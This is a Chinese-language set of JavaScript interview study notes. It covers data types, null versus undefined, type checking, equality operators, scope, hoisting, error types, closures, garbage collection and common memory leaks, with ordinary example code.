------

# 基础部分

----

## 1. 请问在JS中有哪些数据类型？

JavaScript 语言中类型集合由原始值和对象组成。

**原始值**（直接表示在**语言底层的不可变数据**）

除对象类型（object）以外的其它任何类型定义的不可变的值（值本身无法被改变）。例如（与 C 语言不同），JavaScript 中字符串是不可变的（译注：如，JavaScript 中**对字符串的操作一定返回了一个新字符串**，原始字符串并没有被改变）。我们称这些类型的值为“*原始值*”。

- 布尔类型
- Null 类型
- Undefined 类型
- 数字类型
- BigInt 类型
- 字符串类型
- 符号类型(symbol)

符号（Symbols）类型是**唯一**且**不可修改**的原始值，并且可以用来作为对象的键(key)，在某些语言当中也有与之相似的类型（原子类型，atoms）。

**对象**（一组属性的集合）

在计算机科学中, 对象（object）是指内存中的可以被[标识符](https://developer.mozilla.org/zh-CN/docs/Glossary/Identifier)引用的一块区域。



JS数据类型一共有7 + 1种，分为基本数据类型和引用数据类型



### 基本数据类型

- **基本数据类型**：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol、BigInt

Symbol：ES6引入了一种新的原始数据类型，表示独一无二的值，**主要用于解决属性名冲突的问题**，做为标记

BigInt：新增数据类型，是ES2020新增加的，精度大于 2^53 - 1， 是比Number类型支持的范围更大的整数值，在对**大整数**执行运算时，使用BigInt，会减少整数溢出问题

创建方式：BigInt(value)、在一个整数字面量后面加 n 

```js
let a = 10n; 
let b = BigInt(10);  
console.log(a === b);     // true
```

注意：由于在Number 与 BigInt 之间进行转换会损失精度，**建议仅在值可能大于2^53 时使用 BigInt类型**，并且不在两种类型之间进行相互转换。

与Number不同点：

（1）**不能用于 Math 对象中的方法**；

（2）**不能和任何 Number 实例混合运算，两者必须转换成同一种类型**（ BigInt 变量在转换成 Number 变量时可能会丢失精度）

### 引用数据类型

- **引用数据类型**：对象(Object)，其中包含了日期（Date）、函数（Function)、数组（Array）、正则（RegExp）等

### 两者区别

（1）**声明变量时不同的内存分配**：

- 基本：存储在栈中的简单数据段，它们的值直接存储在变量访问的位置

  ​	原因：**基本类型数据占据的空间是固定的**，所以将他们存储在较小的内存区域——栈，便于迅速查寻变量的值

- 引用：存储在堆中的对象，存储在变量处的值是一个指针，指向存储对象的内存地址

  ​	 原因：**引用类型数据的大小会改变**，不能把它放在栈中，否则会降低变量查寻速度，**相反，地址的大小是固定的，可以存在栈中**


（2）**不同的内存分配机制也带来了不同的访问机制**

- 引用：js中不允许直接访问保存在堆内存中的对象，在访问一个对象时，**首先得到对象在堆内存中的地址**，按照这个地址去获得对象中的值（引用访问）

- 基本：可直接访问


（3）**复制变量时的不同**

- 基本：变量复制时，会将原始值的副本赋值给新变量，此后两变量是完全独立的，他们只是拥有相同的值而已（深拷贝）

- 引用：变量复制时，会把内存地址赋值给新变量，新旧变量都指向了堆内存中的同一个对象，任何一个作出的改变都会影响另一个（浅拷贝）


（4）**参数传递的不同**（把实参复制给形参的过程）由于内存分配的差别，两者在传参时也有区别

- 基本：只是把变量里的值传递给参数，**之后参数和这个变量互不影响**

- 引用：**传递的值也就是这个内存地址**，这也就是为什么函数内部对这个参数的修改会体现在外部，因为它们都指向同一个对象



----

## 2. 请问Undefined与Null有何异同点？

共同点：都是基本类型，保存在栈中

不同点：

Undefined表示"缺少值"，**就是此处应该有一个值，但是还没有定义**，转为数值时为NaN。典型用法：

- 变量被声明了，但没有赋值时，就等于undefined
- 调用函数时，应该提供的参数没有提供，该参数等于undefined
- 对象没有赋值的属性，该属性的值为undefined
- 函数没有返回值时，默认返回undefined

Null：

表示"没有对象"，**即该处不应该有值**，转为数值时为0。典型用法是：

- 作为函数的参数，**表示该函数的参数不是对象**
- **作为对象原型链的终点**

注意：

```js
undefined == null; //true
undefined === null; //false
```

ECMAScript 规范： null 和  undefined 的行为很相似，并且**都表示 一个无效的值**，那么它们所表示的内容也具有相似性，故他们相等。

全等操作 === 在比较相等性的时候，两者不是同一类型值，会发生类型转换，故两者不全等。

```js
Number(undefined); // NaN

Number(null); // 0

```

当检测 `null` 或 `undefined` 时，注意[相等（==）与全等（===）两个操作符的区别](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Comparison_Operators) ，前者会执行类型转换：

```js
typeof null        // "object" (因为一些以前的原因而不是'null')
typeof undefined   // "undefined"
null === undefined // false
null  == undefined // true
null === null // true
null == null // true
!null //true
isNaN(1 + null) // false
isNaN(1 + undefined) // true
```



---

## 3.  请问如何判断js变量的数据类型？

常见判断方法有以下四种：

### (1) typeof var Name

返回一个字符串（小写），用来判断：Undefined、String、Number、Boolean、Symbol、Object、Function，无法检测引用类型里的Array

```bash
> typeof(undefined)
'undefined'
> typeof("abc")
'string'
> typeof(100)
'number'
> typeof(false)
'boolean'
> typeof(Symbol(2))
'symbol'

> typeof(BigInt(200))
'bigint'
```

优点：**可区分Object与Function**

缺点：

（1）对于 Null ，返回 object 类型

```js
> typeof(null)
'object'
```

原因：Null类型只有一个null值，该值表示一个**空对象指针**（出自JavaScript高级程序设计）

**typeof的检测原理**：不同的对象在底层都表示为二进制，在js中二进制前**（低）三位存储其类型信息**为：000: Object、100：String、110： Boolean、111： Number。**null的二进制表示全为0，自然前三位也是0，所以执行typeof时会返回"object"。**

  （2） 对于Array、Date、RegExp都会返回object，不能更详细的区分

```js
var fn=function(){};
let obj={a:1};
let arr=[1,2,3];
let now=new Date();
let reg=/abc/;

console.log(typeof(fn));  //function  可区分函数
console.log(typeof(obj));  //object
console.log(typeof(arr));  //object
console.log(typeof(now));  //object
console.log(typeof(reg));  //object
```

### (2) xx instanceof xx

返回true/false，**只能判断引用类型** ，无法检测基本类型

判断原理：**判断一个构造函数的prototype属性所指向的对象是否存在另外一个要检测对象的原型链上**。简单来说：能验证new构造函数创建出来的实例，左边的对象是否是右边的类的实例，**属于验证式判断类型**

缺点：**只能用来判断两个对象是否属于实例关系**， 而不能判断一个对象实例具体属于哪种类型（**原型链上的都会返回true**）

```js
console.log('abc' instanceof String);// false 
console.log( String('abc') instanceof String);// true 

console.log(12 instanceof Number);// false 
console.log(new Number(12) instanceof Number);// true 

console.log(true instanceof Boolean);// false 
console.log(new Boolean(true) instanceof Boolean);// true 

console.log({name:'yy'} instanceof Object);// true 
console.log(new Object({name:'yy'}) instanceof Object);// true 

console.log(['12','123'] instanceof Object);// true 
console.log(['12','123'] instanceof Array);// true 
console.log(new Array('12',32) instanceof Object);// true 
console.log(new Array('12',32) instanceof Array);// true 

console.log(function(){} instanceof Object);// true 
console.log(function(){} instanceof Function);// true 
console.log(new Function() instanceof Function);// true 

console.log(new Date() instanceof Object);// true 
console.log(new RegExp instanceof Object);// true 

console.log(new String('abc') instanceof Object);// true 
console.log(new Number(12) instanceof Object);// true

console.log(null instanceof Object);  //false
console.log(undefined instanceof Object);  //false
console.log(Symbol(2) instanceof Object);  //false
console.log(BigInt(2) instanceof Object);  //false
```



### (3) xx.constructor === xx

返回true/false，判断原理：

当一个函数F被定义时，JS引擎会为F添加prototype原型，然后再在prototype上添加一个constructor属性，并让其指向F的引用

具体来说：当 var f = new F() 时，F被当成了构造函数，f是F的实例对象，**此时F原型上的constructor传递到了f上，因此f.constructor === F**

缺点：不可判断Null、Undefined是无效的对象，**没有constructor存在**

constructor 是不稳定的，如创建的对象更改了原型，无法检测到最初的类型

```js
console.log("abc".constructor===String);  //true
console.log(new Number(2).constructor===Number);  //true
console.log([1,2,3].constructor===Array);  //true
console.log(false.constructor===Boolean);  //true
console.log(new Function().constructor===Function);  //true
console.log(new Date().constructor===Date);  //true
console.log(/abc/.constructor===RegExp);  //true

console.log(document.constructor===HTMLDocument);  //true
```

### (4) Object.prototype.toString.call(xx)

返回“[object type]”（字符串），**能判断所有类型**，万金油方法

判断原理：**JS中的所有对象都是继承自Object对象的**，通过call方法（显式绑定）改变this指向，利用Object.prototype上的原生toString()方法判断数据类型

```js
console.log(Object.prototype.toString.call(123));  // [object Number]
console.log(Object.prototype.toString.call("abc"));  //[object String]
console.log(Object.prototype.toString.call(undefined));  //[object Undefined]
console.log(Object.prototype.toString.call(null));  //[object Null]
console.log(Object.prototype.toString.call(false));  //[object Boolean]

console.log(Object.prototype.toString.call(Symbol(2)));  //[object Symbol]
console.log(Object.prototype.toString.call(100n));  //[object BigInt]

console.log(Object.prototype.toString.call({}));  //[object Object]
console.log(Object.prototype.toString.call([]));  //[object Array]

console.log(Object.prototype.toString.call(new Date()));  //[object Date]
console.log(Object.prototype.toString.call(new RegExp("abc","g")));  //[object RegExp]

console.log(Object.prototype.toString.call(function(){}));  //[object Function]
```



-----

## 4. 请问===与==有何区别？相等与全等的区别

==：相等(值)

**先转换再比较**（强制转换）

- 有布尔值，把false->0， true->1， 调用Number()方法
- 字符串 和 数值，**字符串转数值** ；调用Number()方法
- 对象 和 非对象，**调用对象的valueOf()和toString()方法**把对象转换成基础类型的值再比较，**除Date对象外，会优先尝试使用valueOf()方法**
- **有一个是NaN， 则返回false**。 即使两个都是NaN，也返回false，**因为按照规则，NaN不等于NaN**
- 两个操作数都是对象，则比较他们是不是同一个对象，**如果指向的是同一个对象**，则返回ture 因为对象存的是地址值
- 比较相等性之前， **不能将 null和 undefined转换成其他任何值**

```bash
> 1==true
true
> 2==false
false
> 2===true
false
> 1=="1"
true
> []==""
true

> []==false
true

> []=={}
false
> []==[]
false
> {}=={}
false

> null==undefined
true
> 1==NaN
false

> 0==undefined
false
> 0==null
false

> false==0
true
> false==null
false
> false==undefined
false


```

**=== ： 全等(类型和值）**

**先判断类型再比较**， 类型不同直接不等，不转换类型

```bash
> 0===0
true
> []===[]
false
> 2===2
true
```

---

## 5. 请问你了解js作用域吗？

**1，js作用域**

**概念：**作用域就是一个独立的地盘，让变量不会外泄、暴露出去。也就是说**作用域最大的用处就是隔离变量**，不同作用域下同名变量不会有冲突。

ES6 之前 JavaScript 没有块级作用域,只有**全局作用域**和**函数作用域**。ES6 的到来，为我们提供了‘**块级作用域**’,可通过新增命令 let 和 const 来体现。

作用域：在运行时代码中的某些特定部分中变量、函数和对象的**可访问性**。换句话说，作用域决定了代码区块中变量和其他资源的可见性，作用域就是一个独立的地盘，让变量不会外泄、暴露出去。

**作用域最大作用**：隔离变量，不同作用域下同名变量不会有冲突

作用域是分层的，**内层作用域可以访问外层作用域的变量**，反之不行

**2， JavaScript 没有块级作用域（ES6之前）**，只有全局作用域和函数作用域，ES6引入块级作用域

**全局作用域**（浏览器）：window

- 最外层函数 和在最外层函数外面定义的变量拥有全局作用域

- **所有末定义直接赋值的变量自动声明为拥有全局作用域**
- 所有window对象的属性拥有全局作用域，如window.name、window.location、window.top等

- nodejs 的全局对象：global，**声明全局变量的方式为: global.变量名**

- 在各个模块下都可以直接访问 global 对象

- 一个文件就是一个模块，通过 require 引入模块

**函数作用域**：

- 声明在函数内部的变量


**3，作用域链**

当我们需要某个变量的值时，先去它最近的作用域去找，如果找不到，就找它的上级作用域，依次类推，直到找到全局，如全都未定义，那就抛出一个错误，如下代码所示

```js
var a = 1
function A(){
    function B(){
        console.log(a);
    }
    return B();
}
A();//1

```

常见面试题：

```js
var a=10;
function A(){
    alert(a);
};
function B(){
    var a=20;
    A();
}

B();//10

```

为什么输出10，而不是20？**js中变量的作用域链与定义时的环境有关，与执行时无关**。调用函数B，B中调用了函数A，函数A里面没定义变量a，**函数A只是被B调用且不传参，因此函数A无权使用函数B的局部变量a**，而在上方还有一个全局变量a，因此这里输出10



Scope（作用域）

当前的执行上下文。[值 (en-US)](https://developer.mozilla.org/en-US/docs/Glossary/Value)和**表达式**在其中 "可见" 或可被访问到的上下文。如果一个**[变量 (en-US)](https://developer.mozilla.org/en-US/docs/Glossary/Variable)**或者其他表达式不 "在当前的作用域中"，那么它就是不可用的。 作用域也可以根据代码层次分层，以便子作用域可以访问父作用域，通常是指沿着链式的作用域链查找，而不能从父作用域引用子作用域中的变量和引用。

当然，一个 [Function](https://developer.mozilla.org/zh-CN/docs/Glossary/Function) 将生成一个闭包（通常是返回一个函数引用），这个函数引用从外部作用域（在当前环境下）可以访问闭包内部的作用域。例如，下面的代码是无效的，并不是闭包的形式）：

```js
function exampleFunction() {
    var x = "declared inside function";  // x只能在 exampleFunction 函数中使用
    console.log("Inside function");
    console.log(x);
}

console.log(x);  // 引发error
```

但是，由于变量在函数外被声明为全局变量，因此下面的代码是有效的（当前作用域不存在的变量和引用，就沿着作用域链继续寻找）：

```js
var x = "declared outside function";

exampleFunction();

function exampleFunction() {
    console.log("Inside function");
    console.log(x);
}

console.log("Outside function");
console.log(x);
```

英文原文中，只提到了闭包的简单特例，也就是父作用域引用子作用域的变量或者引用。这儿做一个补充，当一个函数（foo）执行返回一个内部函数（bar）引用时，bar 将会保存 foo 的作用域引用。例如：

```js
function foo() {
    const str = "bar in foo";
    return function bar() {
        return str;
    }
}

var fun = foo();
fun(); // "bar in foo"
```



---

## 6. 请问什么是变量提升？什么是函数提升？

js区别于C、C++、Java语言，在ES6之前，JavaScript没有块级作用域，只有**全局作用域**和**函数作用域**。

这题在面试时尽量用具体代码举例说明

先看下面代码：

```js
console.log(a);

var a=2;  //undefined
```

变量 a 在使用前没有先进行声明，会抛出 ReferenceError异常?还是输出 2 ？事实上都不对，正确答案是输出 undefined（已声明未定义值）

这就是一个典型的 **变量提升** 现象

js 实际上会将 var a = 2 看成两个声明： var a和 a = 2。第一个定义声明在**编译阶段**进行，**第二个赋值声明被留在原地等待执行阶段**

因此上面代码会以如下形式进行处理：

```js
var a; 
console.log(a); 
a = 2;
```

**所有的声明（变量和函数）都会被“移动”到各自作用域的最前端**，这个过程被称为 **变量（函数）提升**

再看一个高频考题：

```js
var a = true;

foo();  // undefined

function foo() {
    if (a) {
        var a = 10;
    }
    console.log(a);
}
```

最终的答案是 undefined，代码实际js执行情况如下：

```js
function foo() { 	
    var a; 	
    if(a) { 		
    	a = 10; 	
    } 	
    console.log(a); 
} 
var a;  
a = true;  
foo();

```

首先， foo(...) {} 的位置被移到了 foo();的前面，**这是函数发生了提升**，在 foo(...) {} 中，为什么会输出 undefined，而不是10？

原因：**JavaScript 中没有块级作用域，**所以 var a = 10会被 JavaScript 分为两步：var a; **会被提升到函数作用域中的最顶端**，声明了一个局部变量 a，在 foo(...) {} 的函数作用域中，**这个重名局部变量 a 会屏蔽全局变量 a**，换句话说，在对 a 的赋值声明之前，在 foo(...) {}中，a 的值都是 undefined，无法进入 if(a) {...} 中，所以最后打印出来 undefined

注意：在 JavaScript 中，函数有两种方式进行声明，函数声明会被提升，**但函数表达式却不会被提升**

```js
var a = true; 
foo();  //TypeError: foo is not a function

var foo = function() { 	//函数表达式
    if(a) { 		
    	var a = 10; 	
	} 	
	console.log(a); 
}

```

```js
var a; 
var foo；  
a = true; 
foo();  
foo = function() { 
    if(a) {      
    	var a = 10;    
    } 
    console.log(a); 
}
```

当执行到foo()时，foo 还没有赋值（如果它是一个函数声明而不是函数表达式，那么就会赋值）。foo()对 undefined 值进行函数调用而导致非法操作，因此会抛出 TypeError 异常

**变量提升的原理**

JavaScript是单线程语言，所以执行肯定是按顺序执行。但是并不是逐行的分析和执行，而是一段一段地分析执行，会先进行编译阶段然后才是执行阶段。**在编译阶段，代码真正执行前的几毫秒，会检测到所有的变量和函数声明**，**所有这些函数和变量声明都被添加到名为Lexical Environment(词法环境)的JavaScript数据结构内的内存中**。所以**这些变量和函数能在它们真正被声明之前使用**。

变量提升（Hoisting）被认为是， Javascript中执行上下文 （特别是创建和执行阶段）工作方式的一种认识。在 [ECMAScript® 2015 Language Specification](https://www.ecma-international.org/ecma-262/6.0/index.html) 之前的JavaScript文档中找不到变量提升（Hoisting）这个词。不过，需要注意的是，开始时，这个概念可能比较难理解，甚至恼人。

例如，从概念的字面意义上说，“变量提升”意味着变量和函数的声明会在物理层面移动到代码的最前面，但这么说并不准确。**实际上变量和函数声明在代码里的位置是不会动的，而是在编译阶段被放入内存中。**

JavaScript 在执行任何代码段之前，将函数声明放入内存中的优点之一是，你可以在声明一个函数之前使用该函数。

```js
/**
* 不推荐的方式：先调用函数，再声明函数
*/

catName("Chloe");

function catName(name) {
    console.log("我的猫名叫 " + name);
}

/*
代码执行的结果是: "我的猫名叫 Chloe"
*/
```

即使我们在定义这个函数之前调用它，函数仍然可以工作。这是因为在 JavaScript 中**执行上下文**的工作方式造成的。

变量提升也适用于其他数据类型和变量。变量可以在声明之前进行初始化和使用。但是如果没有初始化，就不能使用它们。

译者注： 函数和变量相比，会被优先提升。**这意味着函数会被提升到更靠前的位置**。

[只有声明被提升](https://developer.mozilla.org/zh-CN/docs/Glossary/Hoisting#只有声明被提升)

JavaScript 只会提升声明，**不会提升其初始化**。如果一个变量先被使用再被声明和赋值的话，使用时的值是 undefined。参见例子：

```js
console.log(num); // Returns undefined
var num;
num = 6;
```

如果你先赋值、再使用、最后声明该变量，使用时能获取到所赋的值

```js
num = 6;
console.log(num); // returns 6
var num;
```

再来看几个类似的例子：

```js
// Example 1 - only y is hoisted
var x = 1;                 // 声明 + 初始化 x
console.log(x + " " + y);  // '1 undefined'
var y = 2;                 // 声明 + 初始化 y

// Example 2 - Hoists
var num1 = 3;                   // Declare and initialize num1
num2 = 4;                       // Initialize num2
console.log(num1 + " " + num2); //'3 4'
var num2;                       // Declare num2 for hoisting

// Example 3 - Hoists
a = 'Cran';              // Initialize a
b = 'berry';             // Initialize b
console.log(a + "" + b); // 'Cranberry'
var a, b;                // Declare both a & b for hoisting
```



函数优先：函数声明和变量声明都会被提升。**但函数会首先被提升，然后才是变量提升**

```js
foo();  // 1

function foo(){  //函数声明
	console.log("1");
}

foo();  // 1

var foo = function() { 	//函数表达式
	console.log("2"); 
}


foo();  //2
```

输出 1 而不是 2！这段代码片段会被引擎理解为：

```js
function foo() { 	
    console.log('1'); 
}  
var foo;
foo();  
foo = function() {
 	console.log('2'); 
 }
```



---

## 7. 请问js有哪些常见报错类型？它们有什么区别？

在js中常有6种错误类型：TypeError、ReferenceError、SyntaxError、RangeError、EvalError、URIError。其中 TypeError 和 ReferenceError 日常开发会经常碰到。

**TypeError：**类型错误(调用不存在的方法)，变量或参数不是预期类型时发生的错误

```js
var a;

console.log(a.b); //TypeError: Cannot read properties of undefined (reading 'b')
```

变量 a 存在，但a的b属性不存在

**ReferenceError：**引用错误(要用的变量没找到)

```js
console.log(b)  //ReferenceError: b is not defined
```

对 b 进行 **RHS**查询，在所有嵌套作用域中遍寻不到变量

**SyntaxError：**语法错误（给关键字赋值、变量名不符合规范）

```js
//var 1;  //SyntaxError: Unexpected number

function=1;  //SyntaxError: Unexpected token '='
```

**RangeError：**范围错误(参数超范围)，主要有：数组长度为负数、Number对象的方法参数超出范围、函数堆栈超过最大值

```js
// 1、数组长度为负数
[].length = -5      // Uncaught RangeError: Invalid array length

// 2、Number对象的方法参数超出范围
var num = new Number(12.34)
console.log(num.toFixed(-1))   //RangeError: toFixed() digits argument must be between 0 and 100    at Number.toFixed (<anonymous>)

```

**EvalError：**非法调用 eval()，eval()函数没有被正确执行

```js
var myEval = eval;
myEval("alert('call eval')");
// 需要注意的是：ES5以上的JavaScript中已经不再抛出该错误，但依然可以通过new关键字来自定义该类型的错误提示。

new Error([message[fileName[lineNumber]]])
// 第一个参数是错误提示信息，第二个是文件名，第三个是行号。

```

**URIError：**URI不合法，相关函数的参数不正确。

```js
decodeURI("%")     // URIError: URI malformed
```





---

## 8. 什么是LHS和RHS查询？

如上所说，对于var a = 2， js引擎会将它分为两步完成：var a 和 a = 2

变量的赋值操作会执行两个动作：首先编译器会在当前作用域中声明一个变量（如果之前没有声明过），然后在运行时引擎会在引用域中查找该变量，如果能够找到就会对它赋值。

LHS和RHS就是js对变量的两种查找操作， 查找的过程是由作用域（词法作用域）进行协助，在编译的第二步中执行

LHS（Left-hand Side）和RHS（Right-hand Side）通常是指**等号（赋值运算）**的**左右边的查询**，但并不一定意味就是"="的左侧和右侧，赋值操作还有其他几种形式，因此在概念上最好将其理解为：**“赋值操作的目标是谁**（LHS）”以及“**谁是赋值操作的源头**（RHS）”

可以参考下面代码加以理解：

```js
function foo(a) { 	
    var b = a; 	
    return a + b; 
}  
var c = foo(2);
```

代码中一共有3个LHS查询和4个RHS查询

LHS：

```
第2、5行中的b = ...、c = ...，变量在赋值操作的左边，对 b、c 需要 LHS 查询

第5行调用 foo(2) 时，需要将实参2赋值给形参a，所以对 a 需要 LHS 查询
```

RHS：

```
第2行 b = a， a 在赋值操作的右边，需要知道 a的值，对 a 需要 RHS 查询

第3行 reutrn a + b， 需要知道 a 和 b 的值， 分别对 a 和 b 都进行 RHS 查询

第6行 c = foo(2)，foo(2) 在赋值操作的右边，需要知道 foo(2)的值，对 foo(2) 需要 RHS 查询
```

当**RHS**查询不成功**时：会抛出 ReferenceError异常

当**LHS查询不成功**时：会自动隐式地创建一个全局变量（非严格模式下），该变量使用LHS查询的目标作为标识符，或者抛出 ReferenceError 异常（严格模式下）



---

## 9.  请问你了解js中的闭包吗？

概念一：闭包是指有权访问另一个函数作用域中的变量的函数（概念出自《JavaScript高级程序设计》）

概念二：一个函数和对其周围状态（词法环境）的引用捆绑在一起（或者说函数被引用包围），这样的组合就是闭包，也就是说，闭包让你可以在一个内层函数中访问到其外层函数的作用域。（概念出自MDN）

可以简单理解为：闭包就是一个函数，一个外部函数通过调用函数并return返回出内部函数，此**内部函数就是一个闭包**

js作用域只能函数内部向外层访问，**闭包**就是**将函数内部和函数外部连接起**来的一座桥梁，能够**在函数外部访问到函数内部作用域的局部变量**的函数

```js
function f1(){
	var n=10;
	function f2(){  //f2函数就是闭包
		console.log(n);  
	}
	return f2;  //重点在这里，将闭包函数作为返回值，做到f1能访问到f2的内部局部变量
}

var result=f1();
result();  //10
```

此时f2函数形成了一个闭包，因f2函数里需要访问f1作用域下的n变量，但他们不处于同一个作用域，故两者相互牵引，需要输出n，f1中的变量n就必须存在，作用域链在f1中找到n，**输出n时，垃圾回收机制会认为f2还没有执行完成**，但**此时作用域链查找已经到了f1作用域下，所以n的内存空间不会被垃圾回收机制清除**

闭包**优点**：

- 可以读取函数内部的变量
- 延长局部变量寿命，不被垃圾回收机制销毁
- 封装变量（模仿块级作用域）

高频考题：

```js
for(var i = 0; i < 5; i++){
    setTimeout(function(){
        console.log(i); // 输出5个5
    });
}
```

预期应该是输出0、1、2、3、4，但实际是输出5个5，因为setTimeout事件是被异步触发的，当事件被触发的时候，for循环早已经结束

可利用闭包解决该问题：将每次循环的i值封闭起来， 当沿着作用域链从内到外查找变量i时，会先找到被封闭在闭包环境中的i

```js
//1、在setTimeout外部创建一个自执行函数，并将i当作参数传递进闭包
for(var i = 0; i < 5; i++){
    (function(num){
        setTimeout(function(){
            console.log(num);   // 输出0，1，2，3，4         
        }, num*1000);
      }
    )(i);
}

//2、在setTimeout内部函数创建一个闭包，并将i当作参数传递进去
for(var i = 0;i < 5; i++){
    setTimeout(function(num){
        return function(){ //用匿名函数打造一个num变量副本
            console.log(num);   // 输出0，1，2，3，4 
        }
    }(i), i*1000);
}
```

**闭包缺点：**

- **闭包会导致变量不会被垃圾回收机制所清除**，会大量消耗内存
- 使用不恰当可能会造成**内存泄漏**的问题

**避免闭包引起的内存泄漏**：

1、在退出函数之前，将不使用的局部变量全部删除或者赋值为null

**将变量设置为null：切断变量与它此前引用的值之间的连接**，当垃圾回收器下次运行时，会删除这些值并回收它们占用的内存

2、避免变量的循环赋值和引用



闭包：

一个函数和对其周围状态（**lexical environment，词法环境**）的引用捆绑在一起（或者说函数被引用包围）， 这样的组合就是**闭包**（**closure**）。也就是说，**闭包让你可以在一个内层函数中访问到其外层函数的作用域**。在 JavaScript 中，**每当创建一个函数，闭包就会在函数创建的同时被创建出来。**

闭包的特点：

- 让外部访问函数内部变量成为可能；
- 可以避免使用全局变量，**防止全局变量污染**；
- 可以让局部变量常驻在内存中；
- **会造成内存泄漏**（有一块内存空间被长期占用，而不被释放）

应用场景

1. 埋点（是网站分析的一种常用的数据采集方法）计数器

```js
function count() {
    var num = 0;
    return function () {
        return ++num
    }
}

var getNum = count();
var getNewNum = count();
document.querySelectorAll('button')[0].onclick = function(){
    console.log('点击加入购物车次数： '+getNum());
}
document.querySelectorAll('button')[1].onclick = function(){
    console.log('点击付款次数： '+getNewNum());
}    

```

2. 事件+循环

按照以下方式添加事件，打印出来的i不是按照序号的

形成原因就是操作的是同一个词法环境,因为onclick后面的函数都是一个闭包，但是操作的是同一个词法环境

```js
   var lis = document.querySelectorAll('li');
   for (var i = 0; i < lis.length; i++) {
        lis[i].onclick = function () {
            alert(i)
        }       
    }
```

解决办法：

使用匿名函数之后，就形成一个闭包， 操作的就是不同的词法环境

```js
var lis = document.querySelectorAll('li');  
for (var i = 0; i < lis.length; i++) {
     (function (j) {
        lis[j].onclick = function () {
            alert(j)
        }
    })(i)
 }

```



----

## 10. 请问js垃圾回收机制是什么工作原理？

js语言有 自动垃圾回收机制，执行环境会管理 代码执行过程中使用的内存，垃圾收集器会定期（周期性）找出不再继续使用的变量，然后释放其内存

不再使用的变量：**生命周期结束的变量**（局部变量），**全局变量的生命周期直至浏览器卸载页面才会结束**

**栈内存 垃圾回收：**

栈内存中的垃圾回收其实就是**销毁执行栈中的执行上下文**，**栈顶**就是正在执行函数的执行上下文， 当函数执行完毕后，执行栈中对应的执行上下文会被销毁

**ESP** 是执行栈中用来记录当前执行状态的指针， 当执行完一行后**，ESP 指针下移**，即**该行对应的上下文被回收**。 可理解为js引擎就是通过ESP指针的下移操作完成栈内存中的垃圾回收

**堆内存 垃圾回收：**

js中堆内存的垃圾回收主要建立在 代际假说 和 分代收集 两个概念上

**代际假说：**

- 大部分对象的存活时间都很短，分配完内存以后很快就变得不可访问
- “不死”的对象，存活时间都很长

**分代收集：**

- 堆内存分为 新生代 和 老生代 两个区域
- **新生代**区域：存放的都是存活时间比较短，占内存比较小的对象
- **老生代**区域：存放的都是存活时间比较长，占内存比较大的对象

**主垃圾回收器和副垃圾回收器：**

新生代区域：**副垃圾回收器**

老生代区域：**主垃圾回收器**

这两个垃圾回收器的大致工作流程是相同的，可以简化为三步：

（1）、标记待回收的内存

（2）、垃圾内存回收

（3）、内存碎片整理（频繁的垃圾回收后，会产生很多不连续的内存空间，不利于后续数据的存储）

副垃圾回收器 工作流程

主要是对**新生代区域**进行垃圾回收，新生代区域的内存空间比较小，大约是 1~8M

采用的是 Scavenge 算法 进行垃圾回收，主要是将新生代区域 分成两部分：**空闲区域** 和**对象区域**， Scavenge 算法具体工作流程：

（1）、所有进入新生代区域新产生的对象都会存放到对象区域中

（2）、当对象区域被写满的时候会进行垃圾回收

（3）、垃圾回收器会标记垃圾数据（使用“标记清除算法”）

（4）、标记完成后对象区域会**将有效数据按照一定顺序存放到空闲区域的一端**

（5）、存放好后，对象区域和空闲区域会角色互换

（6）、清空当前的空闲区域的内存空间

其中，因为是对象区域的有效数据按照一定顺序放到了空闲区域中，所以也顺便完成内存碎片的整理

注意：新生代区域的空间很小，经常很快被填满，js有一个对象晋升策略解决这种情况：

对象晋升策略规定**：两次垃圾回收还存活的对象就会被移动到老生代区域**

**主垃圾回收器 工作流程**

对老生代区域进行垃圾回收，老生代区域的内存空间要大很多，用 Scavenge算法 效率明要低很多，还是按照以下三步进行垃圾回收：

（1）、通过标记清除算法，标记垃圾数据

（2）、标记垃圾数据后，主垃圾回收器开始进行垃圾回收，**把可回收对象加入到空闲列表中**

（3）、 剩下就是内存碎片整理，主垃圾回收器会将存活的对象移动到一端，然后清理掉边界以外的内存



---

## 11. 什么是标记清除算法与引用计数算法？

两算法都是针对垃圾数据标记的

**标记清除：**js中**最常用**的垃圾回收方式，当变量进入环境时，（一般是在函数中声明一个变量），将这个变量标记为“进入环境”。而当变量离开环境时，则将其标记为“离开环境”。**逻辑上讲，永远不能回收 进入环境的变量 所占用的内存，因为当执行流进入相应的环境，就可能会用到它们**

```js
function test(){
    var a =10;//被标记 ，进入环境
    var b =20;//被标记 ，进入环境
}
test();//执行完毕 之后 a、b又被标离开环境，被回收
```

**引用计数：**跟踪记录每个值被引用的次数。当声明了一个变量并将一个引用类型值赋给该变量时，这个值的引用次数是1；若同一个值又被赋给另一个变量，则该值的引用次数再加1。相反，如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数减1

当这个值的**引用次数变成0时**，则表示没有办法再访问这个值了，其占用的内存空间可回收

```js
function test(){
    var a ={};//a的引用次数为0
    var b = a ;//a的引用次数加1，为1 
    var c = a;//a的引用次数再加1，为2
    var b ={};//a的引用次数减1，为1
}
```

注意：引用计数算法是js早期的垃圾标记算法，现在几乎不怎么用，该算法存在一个问题：**无法应对互相引用的情况**，当两个对象互相引用时，就会永远无法被回收，从而造成内存泄漏。 基于这个问题，后来提出了标记-清除算法



---

## 12. 请问js有哪几种常见的内存泄露情况？

**1、闭包**

闭包可以延长局部变量寿命，若使用不当则会导致内存泄露

**2、意外的全局变量**

js中如果不用var声明变量，该变量将被视为window对象(全局对象)的属性，也就是全局变量，**目前开发场景中：主要还是使用let和const较多**

```js
function foo(arg) {
    bar = "this is a hidden global variable";
}
function foo(arg) {
    window.bar = "this is an explicit global variable";
}
```

上面代码中两个函数是等价的，**调用完函数后，变量仍然存在，会导致泄漏**

如果不注意this的话，也可能发生内存泄露：

```js
function foo() {
    this.variable = "potential accidental global";
}
foo();// 没有对象调用foo, 也没有给它绑定this, 所以this是window
```

解决办法：加上“use strict”，**启用严格模式来避免**，**严格模式会组织创建意外的全局变量**

**3、被遗忘的定时器或者回调**

```js
var someResource = getData();
setInterval(function() {
    var node = document.getElementById('Node');
    if(node) {
        node.innerHTML = JSON.stringify(someResource));
    }
}, 1000);
```

如上代码，**若id为Node的元素从DOM中被移除，但定时器仍会存在**，因为回调函数中包含对someResource的引用，定时器外面的someResource也不会被释放

